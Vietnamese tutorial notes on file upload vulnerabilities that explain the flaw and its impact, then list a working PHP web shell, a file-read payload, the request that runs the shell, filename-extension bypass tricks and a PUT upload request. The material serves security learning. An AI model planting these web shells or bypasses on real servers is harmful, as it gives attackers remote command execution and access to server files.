# Lỗ hổng file upload là gì?
Lỗ hổng file upload xảy ra khi máy chủ web cho phép người dùng file upload hệ thống tệp của mình mà không xác thực đầy đủ các thông tin như tên, loại, nội dung hoặc kích thước. Việc không thực thi đúng các hạn chế này có thể đồng nghĩa với việc ngay cả một chức năng tải hình ảnh cơ bản cũng có thể được sử dụng để tải lên các tệp tùy ý và tiềm ẩn nguy hiểm. Điều này thậm chí có thể bao gồm các tệp tập lệnh phía máy chủ cho phép thực thi mã từ xa.

Trong một số trường hợp, hành động file upload tự nó đã đủ để gây ra thiệt hại. Các cuộc tấn công khác có thể bao gồm một yêu cầu HTTP tiếp theo cho tệp, thường là để kích hoạt việc thực thi tệp bởi máy chủ.
# Tác động của lỗ hổng file upload là gì?
Tác động của lỗ hổng file upload thường phụ thuộc vào hai yếu tố chính:

Trang web không xác thực đúng khía cạnh nào của tệp, có thể là kích thước, loại, nội dung, v.v.

Những hạn chế nào được áp dụng cho tệp sau khi đã tải lên thành công?

Trong trường hợp xấu nhất, loại tệp không được xác thực đúng cách và cấu hình máy chủ cho phép một số loại tệp nhất định (chẳng hạn như `.php` và `.jsp`) được thực thi dưới dạng mã. Trong trường hợp này, kẻ tấn công có thể tải lên một tệp mã phía máy chủ hoạt động như một web shell, trên thực tế cấp cho chúng toàn quyền kiểm soát máy chủ.
# Các trường hợp có thể xảy ra
Trong thực tế, các công ty, tổ chức thường kiểm soát rất tốt lỗ hổng này và tự tin vào khả năng xác thực hệ thống của họ.  
Tuy vậy, khi triển khai 'block' nó thì vẫn có thể tồn tại những trường hợp có thể khiến hệ thống của bạn mắc lỗi này:

- Đơn giản nhất, bạn quên xác thực các loại tệp, nội dung, kích thước,.... của tệp được tải lên
- Bạn tạo blacklist để chặn các loại tệp nguy hiểm nhưng không xác thực những loại extensions lạ (ví dụ: .git, .heheattacker,...)
- Web server của bạn an toàn nhưng <b>không nhất quán</b> khiến attacker có thể sử dụng để <b>'path traversal'</b>
- Hệ thống của bạn bị 'thọt' dẫn đến bị bypass dễ dàng bằng các thủ thuật của attacker
# Playload
Sử dụng php để đọc filesystem:
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
web shell
```
<?php echo system($_GET['cmd']); ?>
```
Kích hoạt shell
```
GET /example/exploit.php?cmd=id HTTP/1.1
```
- [một số shell khác ở đây](https://github.com/HuyPham01/docs/tree/main/CTF/php)

# Bypass extensions
exploit.pHp == .php  
Cung cấp nhiều phần mở rộng. Tùy thuộc vào thuật toán được sử dụng để phân tích tên tệp, tệp sau đây có thể được hiểu là tệp PHP hoặc ảnh JPG:`exploit.php.jpg`  
Thêm ký tự cuối. Một số thành phần sẽ loại bỏ hoặc bỏ qua khoảng trắng, dấu chấm, v.v. ở cuối:`exploit.php.`  
Hãy thử sử dụng mã hóa URL (hoặc mã hóa URL kép) cho dấu chấm, dấu gạch chéo xuôi và dấu gạch chéo ngược. Nếu giá trị không được giải mã khi xác thực phần mở rộng tệp, nhưng sau đó được giải mã ở phía máy chủ, điều này cũng có thể cho phép bạn tải lên các tệp độc hại mà nếu không sẽ bị chặn:`exploit%2Ephp`  
Thêm dấu chấm phẩy hoặc ký tự byte rỗng được mã hóa URL trước phần mở rộng tệp. Nếu xác thực được viết bằng ngôn ngữ cấp cao như PHP hoặc Java, nhưng máy chủ xử lý tệp bằng các hàm cấp thấp hơn trong C/C++, chẳng hạn, điều này có thể gây ra sự khác biệt trong phần được coi là phần cuối của tên tệp: `exploit.asp`;.jpghoặc `exploit.asp%00.jpg`  
Hãy thử sử dụng các ký tự unicode đa byte, có thể được chuyển đổi thành byte rỗng và dấu chấm sau khi chuyển đổi hoặc chuẩn hóa unicode. Các chuỗi như `xC0 x2E`, `xC4 xAE` hoặc `xC0 xAE` có thể được dịch thành `x2E` nếu tên tệp được phân tích cú pháp dưới dạng chuỗi UTF-8, nhưng sau đó được chuyển đổi thành ký tự ASCII trước khi sử dụng trong đường dẫn.  
exploit.p.<b>php</b>hp 

# Uploading files using PUT
Điều đáng chú ý là một số máy chủ web có thể được cấu hình để hỗ trợ các yêu cầu `PUT`. Nếu phòng thủ thích hợp không có mặt, điều này có thể cung cấp một phương tiện thay thế để tải lên các tệp độc hại, ngay cả khi chức năng tải lên không có sẵn thông qua giao diện web.
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
